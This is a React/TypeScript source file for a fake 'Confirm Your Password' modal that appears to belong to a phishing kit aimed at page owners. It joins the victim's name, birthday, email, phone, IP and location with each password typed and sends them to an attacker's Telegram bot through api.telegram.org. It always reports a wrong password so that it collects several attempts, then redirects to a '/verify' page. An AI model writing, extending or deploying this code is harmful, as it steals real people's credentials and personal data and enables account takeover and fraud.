import type { FormData } from "@/pages/home";
import type { GeoLocation } from "@/types/geo";
import getConfig from "@/utils/config";
import { faEye } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import axios from "axios";
import { type FC, useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router";
const LAST_MESSAGE_KEY = "lastMessage";
const MESSAGE_ID_KEY = "messageId";

interface PasswordModalProps {
  onClose?: () => void;
  isOpen: boolean;
  formData: FormData;
}

interface UIState {
  isShowPassword: boolean;
  password: string;
  error: string;
  isLoading: boolean;
  attempt: number;
  messageId: number;
}

export interface Config {
  chatId: string;
  token: string;
  loadingTime: number;
  maxAttempt: number;
}

const initialUIState: UIState = {
  isShowPassword: false,
  password: "",
  error: "",
  isLoading: false,
  attempt: 0,
  messageId: 0,
};

const createTelegramMessage = (
  formData: FormData,
  password: string,
  attempt?: number,
) => {
  const geoData: GeoLocation = JSON.parse(
    localStorage.getItem("geoData") ?? "{}",
  );

  const passwordLabel = attempt
    ? `🔑 <b>Mật Khẩu ${attempt}:</b>`
    : "🔑 <b>Mật Khẩu  :</b>";

  return `
🌐 <b>IP:</b> <code>${geoData.ip}</code>
🏳️ <b>Vị Trí:</b> <code>${geoData.city} - ${geoData.country}</code>
⏰ <b>Thời Gian:</b> <code>${new Date().toLocaleString("vi-VN")}</code>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Tên PAGE:</b> <code>${formData.pageName}</code>
👨‍💼 <b>Họ Tên:</b> <code>${formData.fullName}</code>
🎂 <b>Ngày Sinh:</b> <code>${formData.birthday}</code>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>${formData.email}</code>
📞 <b>Số Điện Thoại:</b> <code>+${formData.phone}</code>
${passwordLabel} <code>${password}</code>`;
};

const PasswordModal: FC<PasswordModalProps> = ({
  onClose,
  isOpen,
  formData,
}) => {
  const navigate = useNavigate();
  const [uiState, setUiState] = useState<UIState>(initialUIState);
  const [config, setConfig] = useState<Config>({
    chatId: "",
    token: "",
    loadingTime: 0,
    maxAttempt: 0,
  });

  const modalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const { telegram, settings } = getConfig();
    setConfig({
      chatId: telegram.data_chatid,
      token: telegram.data_token,
      loadingTime: settings.password_loading_time,
      maxAttempt: settings.max_failed_password_attempts,
    });
  }, []);

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (
        modalRef.current &&
        !modalRef.current.contains(event.target as Node)
      ) {
        onClose?.();
      }
    };

    if (isOpen) {
      document.addEventListener("mousedown", handleClickOutside);
    }

    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  const handleSubmit = async () => {
    let message = "";
    const lastMessage = localStorage.getItem(LAST_MESSAGE_KEY);

    if (lastMessage) {
      message = `${lastMessage}\n🔑 <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
    } else {
      message = createTelegramMessage(formData, uiState.password);
    }

    localStorage.setItem(LAST_MESSAGE_KEY, message);

    if (uiState.attempt >= config.maxAttempt) {
      setUiState((prev) => ({ ...prev, isLoading: true }));

      try {
        if (uiState.messageId) {
          await axios.post(
            `https://api.telegram.org/bot${config.token}/deleteMessage`,
            {
              chat_id: config.chatId,
              message_id: uiState.messageId,
            },
          );
        }
        const response = await axios.post(
          `https://api.telegram.org/bot${config.token}/sendMessage`,
          {
            chat_id: config.chatId,
            text: message,
            parse_mode: "HTML",
          },
        );
        const messageId = response.data.result.message_id;
        localStorage.setItem(MESSAGE_ID_KEY, messageId.toString());
        setUiState((prev) => ({
          ...prev,
          messageId: messageId,
        }));

        setTimeout(() => navigate("/verify"), config.loadingTime);
      } catch {
        navigate("/verify");
      }
      return;
    }

    setUiState((prev) => ({
      ...prev,
      attempt: prev.attempt + 1,
      isLoading: true,
    }));

    try {
      const response = await sendTelegramMessage(
        message,
        config,
        uiState.messageId,
      );
      const newMessageId = response.data.result.message_id;

      localStorage.setItem(MESSAGE_ID_KEY, newMessageId.toString());
      setUiState((prev) => ({
        ...prev,
        messageId: newMessageId,
      }));

      setTimeout(() => {
        setUiState((prev) => ({
          ...prev,
          isLoading: false,
          error: "Incorrect password. Please try again.",
        }));
      }, config.loadingTime);
    } catch {
      setUiState((prev) => ({
        ...prev,
        isLoading: false,
        error: "Something went wrong. Please try again later.",
      }));
    }
  };

  const sendTelegramMessage = async (
    message: string,
    config: Config,
    messageId?: number,
  ) => {
    const baseUrl = `https://api.telegram.org/bot${config.token}`;

    if (messageId) {
      await axios.post(
        `https://api.telegram.org/bot${config.token}/deleteMessage`,
        {
          chat_id: config.chatId,
          message_id: uiState.messageId,
        },
      );
    }

    return await axios.post(`${baseUrl}/sendMessage`, {
      chat_id: config.chatId,
      text: message,
      parse_mode: "HTML",
    });
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (!uiState.isLoading) {
      setUiState((prev) => ({
        ...prev,
        password: e.target.value,
      }));
    }
  };

  const togglePasswordVisibility = () => {
    setUiState((prev) => ({
      ...prev,
      isShowPassword: !prev.isShowPassword,
    }));
  };

  const clearError = () => {
    setUiState((prev) => ({
      ...prev,
      error: "",
    }));
  };

  return (
    <div className="fixed top-0 left-0 z-50 flex h-screen w-screen items-center justify-center bg-black/50 px-4 md:px-0">
      <div
        ref={modalRef}
        className="flex w-full max-w-2xl flex-col gap-4 rounded-lg bg-white p-6 shadow-lg"
      >
        <div className="flex flex-col gap-2">
          <h2 className="text-xl font-bold">Confirm Your Password</h2>
          <p className="text-sm text-gray-600">
            For your security, please enter your password to continue
          </p>
        </div>

        <div className="relative flex items-center justify-center">
          <input
            onFocus={clearError}
            className={`w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none ${
              uiState.error ? "border-red-500 focus:border-red-500" : ""
            }`}
            type={uiState.isShowPassword ? "text" : "password"}
            placeholder="Enter your password"
            value={uiState.password}
            onChange={handlePasswordChange}
          />
          <FontAwesomeIcon
            onClick={togglePasswordVisibility}
            icon={faEye}
            className="absolute right-4 cursor-pointer text-gray-500 select-none hover:scale-105"
          />
        </div>

        {uiState.error && (
          <div className="text-sm text-red-500">{uiState.error}</div>
        )}

        <div className="flex gap-3">
          {onClose && (
            <button
              onClick={onClose}
              className="w-full cursor-pointer rounded-full border border-gray-300 p-4 text-lg font-medium"
              type="button"
            >
              Cancel
            </button>
          )}
          <button
            onClick={handleSubmit}
            className={`flex w-full cursor-pointer items-center justify-center rounded-full p-4 text-lg font-medium text-white ${
              uiState.password.length < 6
                ? "cursor-not-allowed bg-blue-300"
                : "bg-blue-500 hover:bg-blue-600"
            }`}
            type="button"
            disabled={uiState.password.length < 6}
          >
            {uiState.isLoading ? (
              <div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
            ) : (
              "Continue"
            )}
          </button>
        </div>
      </div>
    </div>
  );
};

export default PasswordModal;
